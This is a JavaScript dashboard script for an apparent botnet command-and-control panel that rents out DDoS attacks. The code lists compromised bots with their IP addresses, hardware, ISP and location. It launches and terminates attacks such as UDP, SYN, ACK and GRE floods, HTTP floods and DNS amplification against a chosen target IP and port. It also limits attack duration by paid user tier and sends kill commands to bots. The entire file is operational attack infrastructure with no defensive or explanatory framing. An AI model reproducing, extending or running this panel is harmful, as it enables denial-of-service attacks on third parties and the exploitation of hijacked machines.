/**
 * Dashboard State Manager - Complete Implementation
 */
class DashboardState {
    constructor() {
        // Connection management
        this.sse = null;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 10;
        this.reconnectDelayBase = 1000;
        this.isManualClose = false;
        this.lastBotsData = null;
        this.lastSelectedBot = null;
        this.csrfToken = document.querySelector('meta[name="csrf-token"]').content;

        // State management
        this.isInitialized = false;
        this.lastData = null;
        this.activeModal = null;
        this.pendingRequests = new Map();
        this.eventListeners = new Map();
        this.userLevel = 'User'; // Default level
        this.csrfToken = '';
        this.adminConsoleBtn = null;

        // DOM elements cache
        this.domElements = {
            attackCost: document.getElementById('attack-cost'),
            methodSelect: document.getElementById('method'),
            durationInput: document.getElementById('duration'),
            attackForm: document.querySelector('form[action="/attack"]'),
            attacksTable: document.getElementById('attacks-table'),
            botsTable: document.querySelector('.bot-table-body'),
            profileButton: document.getElementById('profile-button'),
            profileDropdown: document.getElementById('profile-dropdown'),
            adminConsoleBtn: document.getElementById('admin-console-btn'),
            adminPanel: document.getElementById('admin-overlay'),
            addUserForm: document.getElementById('add-user-form'),
            usersTab: document.getElementById('users-content'),
            commandsTab: document.getElementById('commands-content')
        };

        // Initialize password requirement checks
        this.passwordChecks = {
            length: document.getElementById('length-check'),
            case: document.getElementById('case-check'),
            number: document.getElementById('number-check'),
            special: document.getElementById('special-check')
        };
    }

    // Initialization
    async init() {
        if (this.isInitialized) return;

        try {
            // Get CSRF token from meta tag
            const csrfMeta = document.querySelector('meta[name="csrf-token"]');
            this.csrfToken = csrfMeta ? csrfMeta.content : '';

            await this.loadUserData();
            await this.waitForElement('#admin-console-btn');
            this.setupAdminConsoleButton();
            this.setupSSE();
            this.setupEventListeners();
            this.setupPasswordValidation();
            this.isInitialized = true;
            
            // Initialize tabs
            this.switchTab('users');
            
        } catch (error) {
            console.error('Dashboard initialization failed:', error);
            this.showFlashMessage('Failed to initialize dashboard. Please refresh the page.', 'error');
            this.cleanup();
        }
    }

    waitForElement(selector) {
        return new Promise(resolve => {
            if (document.querySelector(selector)) {
                return resolve(document.querySelector(selector));
            }

            const observer = new MutationObserver(() => {
                if (document.querySelector(selector)) {
                    observer.disconnect();
                    resolve(document.querySelector(selector));
                }
            });

            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        });
    }

    setupAdminConsoleButton() {
        this.adminConsoleBtn = document.getElementById('admin-console-btn');
        if (!this.adminConsoleBtn) {
            console.error('Admin console button not found!');
            return;
        }

        this.adminConsoleBtn.addEventListener('click', (e) => {
            e.preventDefault();
            this.showAdminPanel();
            
            // Close profile dropdown if open
            if (this.domElements.profileDropdown) {
                this.domElements.profileDropdown.classList.add('hidden');
            }
        });
    }

    // User Data Management
    async loadUserData() {
        const requestId = Date.now();
        const controller = new AbortController();
        this.pendingRequests.set(requestId, controller);

        try {
            const response = await fetch('/api/user-data', {
                credentials: 'include',
                signal: controller.signal,
                headers: {
                    'X-CSRF-Token': this.csrfToken
                }
            });

            this.pendingRequests.delete(requestId);

            if (!response.ok) {
                const error = await response.json().catch(() => ({}));
                throw new Error(error.message || 'Failed to load data');
            }

            const userData = await response.json();
            this.userLevel = userData.user?.Level || 'User';
            this.updateUserLevelDisplay(userData.user);
            return userData;
        } catch (error) {
            this.pendingRequests.delete(requestId);
            
            if (error.name !== 'AbortError') {
                const message = error.message.includes('Unauthorized') 
                    ? 'Session expired - please login again'
                    : 'Failed to load dashboard data. Please try again.';
                
                this.showFlashMessage(message, 'error');
                
                if (error.message.includes('Unauthorized')) {
                    setTimeout(() => {
                        window.location.href = '/';
                    }, 2000);
                }
            }
            throw error;
        }
    }

    // SSE Connection Management
    setupSSE() {
        if (this.isManualClose) return;
    
        // Clear existing connection if any
        if (this.sse) {
            this.sse.close();
            this.sse = null;
        }
    
        const url = new URL('/sse', window.location.origin);
        this.sse = new EventSource(url.toString(), {
            withCredentials: true
        });
    
        // Connection established
        this.sse.onopen = () => {
            console.log('SSE connection established');
            this.reconnectAttempts = 0;
            this.updateConnectionStatus(true);
            
            // Request fresh data on reconnect
            this.loadUserData().catch(console.error);
        };
    
        // Connection error
        this.sse.onerror = (error) => {
            console.error('SSE connection error:', error);
            this.updateConnectionStatus(false);
            
            // Don't immediately close - let it attempt to reconnect
            if (this.sse.readyState === EventSource.CLOSED) {
                this.scheduleReconnect();
            }
        };
    
        // Message handler
        const handleMessage = (event) => {
            if (event.data.trim() === ': heartbeat') return;
            
            try {
                const data = JSON.parse(event.data);
                this.lastData = data;
                
                // Update attacks table if attack data is present
                if (data.Attacks || data.eventType === 'attack-update') {
                    this.updateAttacksTable(data.Attacks || []);
                }
                
                // Update other dashboard components
                this.updateDashboard(data);
            } catch (e) {
                console.error('Error parsing SSE message:', e);
            }
        };
    
        // Event listeners
        this.sse.addEventListener('message', handleMessage);
        this.sse.addEventListener('bot-connected', handleMessage);
        this.sse.addEventListener('bot-disconnected', handleMessage);
        
        // Store the handler so we can remove it later
        this.sseMessageHandler = handleMessage;
    }
    
    scheduleReconnect() {
        if (this.reconnectAttempts >= this.maxReconnectAttempts) {
            this.showFlashMessage('Connection lost - please refresh the page', 'error');
            return;
        }
    
        const delay = Math.min(
            this.reconnectDelayBase * Math.pow(2, this.reconnectAttempts),
            30000 // Max 30 seconds
        );
        
        console.log(`Attempting reconnect in ${delay}ms (attempt ${this.reconnectAttempts + 1})`);
        
        setTimeout(() => {
            this.reconnectAttempts++;
            this.setupSSE();
        }, delay);
    }
    
    updateDashboard(data) {
        if (!data) {
            console.warn('Received empty dashboard data');
            return;
        }
    
        this.updateMetrics(data);
        this.updateAttacksTable(data.Attacks || []);
        
        // Only update bots if we have new data
        if (data.Bots) {
            this.lastBotsData = data.Bots; // Store the last received bots
            this.updateBotsTable(data.Bots);
        } else if (this.lastBotsData) {
            // If no new bots data but we have previous data, use that
            this.updateBotsTable(this.lastBotsData);
        }
    }

    updateMetrics(data) {
        // Update bot count
        const botCountElements = document.querySelectorAll('.bot-count-metric');
        if (botCountElements.length && data.BotCount !== undefined) {
            botCountElements.forEach(el => el.textContent = data.BotCount);
        }

        // Update attack count
        const attackCountElement = document.querySelector('.attack-count-metric');
        if (attackCountElement && data.ActiveAttacks !== undefined && data.MaxConcurrentAttacks !== undefined) {
            attackCountElement.textContent = `${data.ActiveAttacks}/${data.MaxConcurrentAttacks}`;
        }

        // Update attack power
        const attackPowerElement = document.querySelector('.attack-power-metric');
        if (attackPowerElement && data.AttackPower !== undefined) {
            attackPowerElement.textContent = `${data.AttackPower.toFixed(2)} Gbps`;
        }
    }

    updateAttacksTable(attacks) {
        if (!this.domElements.attacksTable) return;
        
        // Convert attack duration and remaining time to readable format
        const formattedAttacks = attacks.map(attack => {
            return {
                ...attack,
                Duration: this.formatDuration(attack.Duration),
                Remaining: this.formatRemainingTime(attack.Start, attack.Duration)
            };
        });
    
        if (formattedAttacks.length > 0) {
            this.domElements.attacksTable.innerHTML = formattedAttacks.map(attack => `
                <tr>
                    <td>
                        <span class="attack-method-badge">
                            ${this.getMethodIcon(attack.Method)} ${this.getMethodName(attack.Method)}
                        </span>
                    </td>
                    <td class="font-mono text-primary">${attack.Target || 'N/A'}:${attack.Port || 'N/A'}</td>
                    <td class="text-primary">${attack.Duration || 'N/A'}</td>
                    <td class="text-primary">${attack.Remaining || 'N/A'}</td>
                    <td>
                        <a href="/stop-attack?id=${attack.ID || ''}" class="attack-stop-btn">
                            <i class="fas fa-stop mr-1"></i> Terminate
                        </a>
                    </td>
                </tr>
            `).join('');
        } else {
            this.domElements.attacksTable.innerHTML = `
                <tr>
                    <td colspan="5" class="text-center text-dim font-mono">No active engagements</td>
                </tr>
            `;
        }
    }
    
    // Helper method to format duration
    formatDuration(seconds) {
        if (!seconds) return 'N/A';
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return minutes > 0 ? `${minutes}m ${remainingSeconds}s` : `${seconds}s`;
    }
    
    // Helper method to calculate remaining time
    formatRemainingTime(startTime, duration) {
        if (!startTime || !duration) return 'N/A';
        
        try {
            const start = new Date(startTime);
            const end = new Date(start.getTime() + duration * 1000);
            const now = new Date();
            const remaining = Math.max(0, (end - now) / 1000); // in seconds
            
            return this.formatDuration(Math.round(remaining));
        } catch (e) {
            console.error('Error calculating remaining time:', e);
            return 'N/A';
        }
    }

    updateBotsTable(bots) {
        if (!this.domElements.botsTable) return;
        
        // Filter out bots with no IP (invalid entries)
        const validBots = (bots || []).filter(bot => bot.IP);
        
        if (validBots.length > 0) {
            this.domElements.botsTable.innerHTML = validBots.map(bot => {
                // Calculate if bot is active (last heartbeat within 2 minutes)
                const isActive = this.isBotActive(bot.LastHeartbeat);
                const location = [bot.City, bot.Region, bot.Country].filter(Boolean).join(', ') || 'Unknown';
                const lastHeartbeat = bot.LastHeartbeat ? new Date(bot.LastHeartbeat).toLocaleString() : 'Never';
                
                return `
                    <tr class="bot-row" data-bot='${JSON.stringify(bot)}'>
                        <td>
                            <span class="status-indicator ${isActive ? 'status-active' : 'status-inactive'}"></span>
                            ${isActive ? 'Active' : 'Inactive'}
                        </td>
                        <td class="font-mono text-primary">${bot.IP || 'Unknown'}</td>
                        <td class="text-primary">${bot.Arch || 'Unknown'}</td>
                        <td class="text-primary">${bot.Cores || 'N/A'}</td>
                        <td class="text-primary">${bot.RAM ? `${bot.RAM.toFixed(2)} GB` : 'N/A'}</td>
                        <td class="text-primary">${location}</td>
                        <td class="text-primary">${lastHeartbeat}</td>
                    </tr>
                `;
            }).join('');
        } else if (this.lastBotsData && this.lastBotsData.length > 0) {
            // If no current bots but we have previous data, show that with inactive status
            this.domElements.botsTable.innerHTML = this.lastBotsData.map(bot => {
                const location = [bot.City, bot.Region, bot.Country].filter(Boolean).join(', ') || 'Unknown';
                const lastHeartbeat = bot.LastHeartbeat ? new Date(bot.LastHeartbeat).toLocaleString() : 'Never';
                
                return `
                    <tr class="bot-row" data-bot='${JSON.stringify(bot)}'>
                        <td>
                            <span class="status-indicator status-inactive"></span>
                            Inactive
                        </td>
                        <td class="font-mono text-primary">${bot.IP || 'Unknown'}</td>
                        <td class="text-primary">${bot.Arch || 'Unknown'}</td>
                        <td class="text-primary">${bot.Cores || 'N/A'}</td>
                        <td class="text-primary">${bot.RAM ? `${bot.RAM.toFixed(2)} GB` : 'N/A'}</td>
                        <td class="text-primary">${location}</td>
                        <td class="text-primary">${lastHeartbeat}</td>
                    </tr>
                `;
            }).join('');
        } else {
            this.domElements.botsTable.innerHTML = `
                <tr>
                    <td colspan="7" class="text-center text-dim font-mono">No bots connected</td>
                </tr>
            `;
        }
    }

    updateUserLevelDisplay(user) {
        if (!user || !user.Level) return;
        
        const levelBadges = document.querySelectorAll('.user-level-badge');
        if (!levelBadges.length) return;

        levelBadges.forEach(badge => {
            badge.textContent = user.Level;
            badge.className = `user-level-badge ${this.getLevelBadgeClass(user.Level)}`;
        });
    }

    updateConnectionStatus(connected) {
        const statusElement = document.getElementById('connection-status');
        const textElement = document.getElementById('connection-text');
        
        if (statusElement && textElement) {
            if (connected) {
                statusElement.className = 'status-indicator status-active';
                statusElement.title = 'Connected';
                textElement.textContent = 'Connected';
                textElement.style.color = '#4ade80';
            } else {
                statusElement.className = 'status-indicator status-inactive';
                statusElement.title = 'Disconnected';
                textElement.textContent = 'Disconnected';
                textElement.style.color = '#f87171';
            }
        }
        
        if (!connected && this.domElements.attacksTable) {
            this.domElements.attacksTable.innerHTML = `
                <tr>
                    <td colspan="5" class="text-center text-dim font-mono">
                        <i class="fas fa-sync-alt fa-spin"></i> Reconnecting...
                    </td>
                </tr>
            `;
        }
    }

    // Bot Management
    showBotDetails(bot) {
        // Store the last selected bot
        this.lastSelectedBot = bot;
        
        // Determine if we should show as active (consider connection status)
        const isConnected = this.sse && this.sse.readyState === EventSource.OPEN;
        const showAsActive = isConnected && this.isBotActive(bot.LastHeartbeat);
    
        const modalContent = `
            <div class="bot-details">
                <h3 class="cyber-title">
                    <i class="fas fa-robot text-primary"></i> Bot Details
                </h3>
                <div class="detail-grid">
                    <div class="detail-row">
                        <span class="detail-label">Status:</span>
                        <span class="detail-value ${showAsActive ? 'text-success' : 'text-dim'}">
                            ${showAsActive ? 'Active' : (isConnected ? 'Inactive' : 'Status Unknown')}
                        </span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">IP Address:</span>
                        <span class="detail-value font-mono">${bot.IP || 'Unknown'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Architecture:</span>
                        <span class="detail-value">${bot.Arch || 'Unknown'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">CPU Cores:</span>
                        <span class="detail-value">${bot.Cores || 'Unknown'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">RAM:</span>
                        <span class="detail-value">${bot.RAM ? `${bot.RAM.toFixed(2)} GB` : 'Unknown'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Location:</span>
                        <span class="detail-value">
                            ${[bot.City, bot.Region, bot.Country].filter(Boolean).join(', ') || 'Unknown'}
                        </span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">ISP:</span>
                        <span class="detail-value">${bot.ISP || 'Unknown'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Last Heartbeat:</span>
                        <span class="detail-value">${bot.LastHeartbeat ? new Date(bot.LastHeartbeat).toLocaleString() : 'Never'}</span>
                    </div>
                </div>
                <div class="bot-actions">
                    <button class="cyber-btn" onclick="sendBotCommand('PING ${bot.IP}')">
                        <i class="fas fa-network-wired"></i> Ping Bot
                    </button>
                    <button class="cyber-btn" onclick="sendBotCommand('INFO ${bot.IP}')">
                        <i class="fas fa-info-circle"></i> Get Info
                    </button>
                    ${this.userLevel === 'Owner' || this.userLevel === 'Admin' ? `
                    <button class="cyber-btn destructive" onclick="if(confirm('Are you sure you want to terminate this bot?')) sendBotCommand('KILL ${bot.IP}')">
                        <i class="fas fa-skull"></i> Terminate
                    </button>
                    ` : ''}
                </div>
            </div>
        `;
    
        const modal = document.getElementById('bot-details-modal');
        if (!modal) {
            const newModal = document.createElement('div');
            newModal.id = 'bot-details-modal';
            newModal.className = 'modal';
            newModal.innerHTML = `
                <div class="modal-content">
                    <button class="modal-close-btn" onclick="hideBotDetails()">
                        <i class="fas fa-times"></i>
                    </button>
                    ${modalContent}
                </div>
            `;
            document.body.appendChild(newModal);
            this.showModal('bot-details-modal');
        } else {
            modal.querySelector('.modal-content').innerHTML = `
                <button class="modal-close-btn" onclick="hideBotDetails()">
                    <i class="fas fa-times"></i>
                </button>
                ${modalContent}
            `;
            this.showModal('bot-details-modal');
        }
    }

    // Attack Management
    async stopAllAttacks() {
        try {
            const response = await fetch('/stop-all-attacks', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Content-Type': 'application/json'
                }
            });

            if (!response.ok) {
                throw new Error(await response.text());
            }

            this.showFlashMessage('All attacks stopped', 'success');
        } catch (error) {
            this.showFlashMessage(`Failed to stop attacks: ${error.message}`, 'error');
        }
    }

    validateAttackForm() {
        const form = this.domElements.attackForm;
        if (!form) return;

        const method = form.elements.method.value;
        const target = form.elements.ip.value;
        const port = form.elements.port.value;
        const duration = form.elements.duration.value;
        const submitBtn = form.querySelector('button[type="submit"]');

        let isValid = true;

        // Validate target
        if (!target || (!this.isValidIP(target) && !this.isValidHostname(target))) {
            isValid = false;
        }

        // Validate port
        const portNum = parseInt(port);
        if (!port || isNaN(portNum) || portNum < 1 || portNum > 65535) {
            isValid = false;
        }

        // Validate duration
        const durationNum = parseInt(duration);
        const maxDuration = this.getMaxAttackDuration();
        if (!duration || isNaN(durationNum) || durationNum < 10 || durationNum > maxDuration) {
            isValid = false;
        }

        submitBtn.disabled = !isValid;
    }

    // User Management
    setupPasswordValidation() {
        const passwordInput = document.getElementById('new-password');
        if (!passwordInput) return;

        passwordInput.addEventListener('input', () => {
            const password = passwordInput.value;
            this.updatePasswordRequirements(password);
        });
    }

    updatePasswordRequirements(password) {
        if (!password) {
            Object.values(this.passwordChecks).forEach(check => {
                check.className = 'fas fa-check-circle text-dim';
            });
            return;
        }

        // Check length (min 12 chars)
        if (password.length >= 12) {
            this.passwordChecks.length.className = 'fas fa-check-circle text-success';
        } else {
            this.passwordChecks.length.className = 'fas fa-check-circle text-dim';
        }

        // Check case (both upper and lower)
        if (/[a-z]/.test(password) && /[A-Z]/.test(password)) {
            this.passwordChecks.case.className = 'fas fa-check-circle text-success';
        } else {
            this.passwordChecks.case.className = 'fas fa-check-circle text-dim';
        }

        // Check number
        if (/\d/.test(password)) {
            this.passwordChecks.number.className = 'fas fa-check-circle text-success';
        } else {
            this.passwordChecks.number.className = 'fas fa-check-circle text-dim';
        }

        // Check special character
        if (/[^a-zA-Z0-9]/.test(password)) {
            this.passwordChecks.special.className = 'fas fa-check-circle text-success';
        } else {
            this.passwordChecks.special.className = 'fas fa-check-circle text-dim';
        }
    }

    // Utility Methods
    getMethodIcon(method) {
        const icons = {
            '!udpflood': 'fa-bolt',
            '!udpsmart': 'fa-brain',
            '!tcpflood': 'fa-network-wired',
            '!synflood': 'fa-sync',
            '!ackflood': 'fa-reply',
            '!greflood': 'fa-project-diagram',
            '!dns': 'fa-server',
            '!http': 'fa-globe',
            'default': 'fa-question'
        };
        return `<i class="fas ${icons[method] || icons.default}"></i>`;
    }

    getMethodName(method) {
        const names = {
            '!udpflood': 'UDP Flood',
            '!udpsmart': 'UDP Smart',
            '!tcpflood': 'TCP Flood',
            '!synflood': 'SYN Flood',
            '!ackflood': 'ACK Flood',
            '!greflood': 'GRE Flood',
            '!dns': 'DNS Amplification',
            '!http': 'HTTP Flood',
            'default': method
        };
        return names[method] || names.default;
    }

    isBotActive(lastHeartbeat) {
        if (!lastHeartbeat) return false;
        try {
            const now = new Date();
            const heartbeat = new Date(lastHeartbeat);
            return (now - heartbeat) <= 60000; // 1 minute
        } catch (e) {
            console.error('Error checking bot activity:', e);
            return false;
        }
    }

    getLevelBadgeClass(level) {
        const levelMap = {
            'Owner': 'cyber-badge-owner',
            'Admin': 'cyber-badge-admin',
            'Pro': 'cyber-badge-stealth',
            'Basic': 'cyber-badge-maintenance',
            'default': 'cyber-badge-user'
        };
        return levelMap[level] || levelMap.default;
    }

    getMaxAttackDuration() {
        switch (this.userLevel) {
            case 'Owner': return 3600;
            case 'Admin': return 1800;
            case 'Pro': return 600;
            case 'Basic': return 300;
            default: return 60;
        }
    }

    isValidIP(ip) {
        return /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip);
    }

    isValidHostname(hostname) {
        return /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+$/.test(hostname);
    }

    // Modal Management
    showModal(modalId) {
        this.hideAllModals();
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.remove('hidden');
            this.activeModal = modalId;
            document.body.classList.add('no-scroll');
        }
    }

    hideModal() {
        if (this.activeModal) {
            const modal = document.getElementById(this.activeModal);
            if (modal) modal.classList.add('hidden');
            this.activeModal = null;
            document.body.classList.remove('no-scroll');
        }
    }

    hideAllModals() {
        document.querySelectorAll('.overlay').forEach(modal => {
            modal.classList.add('hidden');
        });
        if (this.domElements.profileDropdown) {
            this.domElements.profileDropdown.classList.add('hidden');
        }
        this.activeModal = null;
        document.body.classList.remove('no-scroll');
    }

    switchTab(tabName) {
        // Hide all tab contents
        const activeModal = document.getElementById(this.activeModal);
        if (activeModal) {
            activeModal.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            // Deactivate all tab buttons
            activeModal.querySelectorAll('.tab-button').forEach(button => {
                button.classList.remove('active');
            });
        }
        
        // Activate selected tab
        const content = document.getElementById(`${tabName}-content`);
        const tab = document.getElementById(`${tabName}-tab`);
        
        if (content) content.classList.add('active');
        if (tab) tab.classList.add('active');
    }

    // Admin Panel
    showAdminPanel() {
        if (this.userLevel !== 'Owner' && this.userLevel !== 'Admin') {
            this.showFlashMessage('Access denied: Admin privileges required', 'error');
            return;
        }
        
        const adminOverlay = document.getElementById('admin-overlay');
        if (adminOverlay) {
            adminOverlay.classList.remove('hidden');
            document.body.classList.add('no-scroll');
            this.activeModal = 'admin-overlay';
            
            // Initialize with users tab
            this.switchTab('users');
            
            // Hide settings tab if not owner
            const settingsTab = document.getElementById('settings-tab');
            if (settingsTab) {
                settingsTab.style.display = this.userLevel === 'Owner' ? 'block' : 'none';
            }
            
            // Make sure the form is hidden initially
            this.hideAddUserForm();
        }
    }

    showAddUserForm() {
        const form = document.getElementById('add-user-form');
        if (form) {
            form.classList.remove('hidden');
            // Reset form
            form.reset();
            // Reset validation indicators
            Object.values(this.passwordChecks).forEach(check => {
                check.className = 'fas fa-check-circle text-dim';
            });
        }
    }

    hideAddUserForm() {
        const form = document.getElementById('add-user-form');
        if (form) form.classList.add('hidden');
    }

    // Bot List Refresh
    async refreshBotList() {
        try {
            const response = await fetch('/api/user-data', {
                credentials: 'include',
                headers: {
                    'X-CSRF-Token': this.csrfToken
                }
            });

            if (!response.ok) {
                throw new Error(await response.text());
            }

            const data = await response.json();
            this.updateBotsTable(data.Bots || []);
            this.showFlashMessage('Bot list refreshed', 'success');
        } catch (error) {
            this.showFlashMessage(`Failed to refresh bot list: ${error.message}`, 'error');
        }
    }

    // Event Handling
    setupEventListeners() {
        // Profile dropdown toggle
        if (this.domElements.profileButton && this.domElements.profileDropdown) {
            this.domElements.profileButton.addEventListener('click', (e) => {
                e.stopPropagation();
                this.domElements.profileDropdown.classList.toggle('hidden');
            });
        }

        // Admin console button
        const adminConsoleBtn = document.getElementById('admin-console-btn');
        if (adminConsoleBtn) {
            adminConsoleBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.showAdminPanel();
                // Close the dropdown if open
                if (this.domElements.profileDropdown) {
                    this.domElements.profileDropdown.classList.add('hidden');
                }
            });
        }

        document.querySelectorAll('.tab-button').forEach(button => {
            button.addEventListener('click', (e) => {
                const tabName = e.currentTarget.dataset.tab;
                this.switchTab(tabName);
            });
        });

        // Close dropdown when clicking outside
        document.addEventListener('click', (e) => {
            if (this.domElements.profileDropdown && 
                !this.domElements.profileDropdown.contains(e.target) && 
                !this.domElements.profileButton.contains(e.target)) {
                this.domElements.profileDropdown.classList.add('hidden');
            }
        });

        // Bot row clicks
        document.addEventListener('click', (e) => {
            const botRow = e.target.closest('.bot-row');
            if (botRow) {
                const botData = JSON.parse(botRow.dataset.bot);
                this.showBotDetails(botData);
            }
        });

        // Attack form validation
        if (this.domElements.attackForm) {
            this.domElements.attackForm.addEventListener('input', () => {
                this.validateAttackForm();
            });

            this.domElements.attackForm.addEventListener('submit', (e) => {
                const submitButton = e.target.querySelector('button[type="submit"]');
                if (submitButton) {
                    submitButton.disabled = true;
                    submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Launching...';
                }
            });
        }

        // Close modals when clicking outside
        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('overlay')) {
                this.hideModal();
            }
        });

        // Close modals with escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.hideModal();
            }
        });
    }

    // UI Helpers
    showFlashMessage(message, type = 'info') {
        // Remove any existing flash messages
        document.querySelectorAll('.cyber-flash').forEach(el => el.remove());
        
        // Create new flash message
        const flashContainer = document.createElement('div');
        flashContainer.className = `cyber-flash ${type}`;
        flashContainer.innerHTML = `
            <span class="font-mono">${message}</span>
            <button class="cyber-flash-btn" onclick="this.parentElement.remove()">
                <i class="fas fa-times"></i>
            </button>
        `;
        
        // Add to DOM
        document.body.prepend(flashContainer);
        
        // Auto-dismiss after 5 seconds
        setTimeout(() => {
            flashContainer.style.opacity = '0';
            setTimeout(() => flashContainer.remove(), 300);
        }, 5000);
    }

    // Cleanup
    cleanup() {
        // Close SSE connection
        if (this.sse && this.sseMessageHandler) {
            this.sse.removeEventListener('message', this.sseMessageHandler);
            this.sse.removeEventListener('bot-connected', this.sseMessageHandler);
            this.sse.removeEventListener('bot-disconnected', this.sseMessageHandler);
        }
        
        if (this.sse) {
            this.sse.close();
            this.sse = null;
        }
        
        // Abort pending requests
        this.pendingRequests.forEach((controller, key) => {
            controller.abort();
            this.pendingRequests.delete(key);
        });

        // Remove all event listeners
        this.eventListeners.forEach((listeners, type) => {
            listeners.forEach(listener => {
                document.removeEventListener(type, listener);
            });
        });
        this.eventListeners.clear();
    }
}

// Utility functions
function togglePasswordVisibility(inputId) {
    const input = document.getElementById(inputId);
    if (input) {
        const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
        input.setAttribute('type', type);
        
        const toggleBtn = input.nextElementSibling;
        if (toggleBtn) {
            toggleBtn.querySelector('i').className = type === 'password' ? 'fas fa-eye' : 'fas fa-eye-slash';
        }
    }
}

function copyToClipboard(text) {
    if (!text) return;
    
    navigator.clipboard.writeText(text).then(() => {
        const dashboard = window.dashboard || new DashboardState();
        dashboard.showFlashMessage('Copied to clipboard', 'success');
    }).catch(err => {
        console.error('Failed to copy:', err);
        const dashboard = window.dashboard || new DashboardState();
        dashboard.showFlashMessage('Failed to copy to clipboard', 'error');
    });
}

async function sendBotCommand(command) {
    try {
        const dashboard = window.dashboard || new DashboardState();
        const response = await fetch('/admin-command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRF-Token': dashboard.csrfToken
            },
            body: `command=${encodeURIComponent(command)}`,
            credentials: 'include'
        });

        if (!response.ok) {
            throw new Error(await response.text());
        }

        dashboard.showFlashMessage('Command sent successfully', 'success');
        dashboard.hideModal();
    } catch (error) {
        const dashboard = window.dashboard || new DashboardState();
        dashboard.showFlashMessage(`Command failed: ${error.message}`, 'error');
    }
}

// Initialize dashboard when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    const dashboard = new DashboardState();
    dashboard.init();

    // Expose methods to global scope
    window.dashboard = dashboard;
    window.showAdminPanel = () => dashboard.showAdminPanel();
    window.hideAdminPanel = () => dashboard.hideModal();
    window.stopAllAttacks = () => dashboard.stopAllAttacks();
    window.hideBotDetails = () => dashboard.hideModal();
    window.switchTab = (tabName) => dashboard.switchTab(tabName);
    window.showAddUserForm = () => dashboard.showAddUserForm();
    window.hideAddUserForm = () => dashboard.hideAddUserForm();
    window.togglePasswordVisibility = togglePasswordVisibility;
    window.copyToClipboard = copyToClipboard;
    window.sendBotCommand = sendBotCommand;
    window.refreshBotList = () => dashboard.refreshBotList();
});